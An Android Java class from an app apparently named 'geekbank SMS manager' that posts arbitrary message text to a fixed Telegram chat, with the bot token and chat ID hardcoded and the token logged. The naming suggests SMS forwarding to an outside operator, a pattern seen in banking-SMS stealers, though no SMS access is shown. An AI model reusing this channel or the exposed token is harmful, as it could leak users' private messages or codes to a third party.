package com.example.geekbank_sms_manager;

import android.content.Context;
import android.util.Log;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

public class TelegramService {

    private static final String TAG = "TelegramService";
    private static final String TELEGRAM_BOT_TOKEN = "7380701994:AAEjFku13cK8ZatzNch_E8uOZaiFze1IDAE";
    private static final String TELEGRAM_CHAT_ID = "7364032510";

    public void sendToTelegram(Context context, String message) {
        try {
            String encodedMessage = URLEncoder.encode(message, "UTF-8");
            /* https://api.telegram.org/bot7380701994:AAEjFku13cK8ZatzNch_E8uOZaiFze1IDAE/sendMessage?chat_id=7364032510&text=hello */
            String url = "https://api.telegram.org/bot7380701994:AAEjFku13cK8ZatzNch_E8uOZaiFze1IDAE/sendMessage?chat_id=7364032510&text=" + encodedMessage;
            Log.d(TAG, "URL: " + url); // Imprimir el URL para depuración

            RequestQueue queue = Volley.newRequestQueue(context);
            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.d(TAG, "Response from Telegram: " + response);
                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d(TAG, "Error: " + error.toString());
                }
            });
            queue.add(stringRequest);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
}
